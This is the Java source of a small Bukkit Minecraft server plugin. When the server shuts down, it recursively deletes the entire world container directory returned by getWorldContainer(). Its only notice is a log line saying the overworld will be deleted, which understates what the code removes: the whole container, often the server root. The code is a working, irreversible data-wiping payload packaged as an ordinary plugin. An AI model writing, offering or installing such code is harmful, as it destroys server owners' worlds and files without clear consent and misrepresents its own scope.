package me.EssexIO;

import java.io.File;
import java.util.logging.Level;

import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin {
	static public boolean deleteDirectory(File path) {
		if( path.exists() ) {
			final File[] files = path.listFiles();
			for (final File file2 : files) {
				if(file2.isDirectory()) {
					deleteDirectory(file2);
				}
				else {
					file2.delete();
				}
			}
		}
		return( path.delete() );
	}

	@Override
	public void onDisable() {
		getServer().getLogger().log(Level.INFO, "-----SERVER WORLD BEING DELETED-----");
		deleteDirectory(getServer().getWorldContainer());
	}

	@Override
	public void onEnable() {
		getServer().getLogger().log(Level.INFO, "--- WARNING: The overworld **WILL** be deleted when the server stops! ---");
	}
}

